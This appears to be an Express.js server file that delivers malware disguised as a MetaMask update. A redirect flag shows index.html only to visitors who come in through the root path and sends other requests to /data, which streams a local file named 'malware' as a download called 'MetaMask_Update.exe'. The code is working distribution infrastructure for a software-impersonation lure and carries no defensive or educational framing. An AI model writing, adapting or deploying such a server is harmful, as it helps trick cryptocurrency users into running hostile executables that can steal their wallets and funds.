const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

let redirect = false;

app.get('/', (req, res) => {
    redirect = true;
    res.setHeader('Cache-Control', 'no-store');
    res.redirect('/index.html');
});

app.get('/index.html', (req, res) => {
    res.setHeader('Cache-Control', 'no-store');
    if (redirect) {
        redirect = false;
        res.sendFile(path.join(__dirname, 'index.html'));
    } else {
        res.redirect('/data');
    }
});

app.get('/data', (req, res) => {
    const filePath = path.join(__dirname, 'malware');
    if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
        return res.status(404).send('File not found');
    }
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="MetaMask_Update.exe"');
    fs.createReadStream(filePath).pipe(res);
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
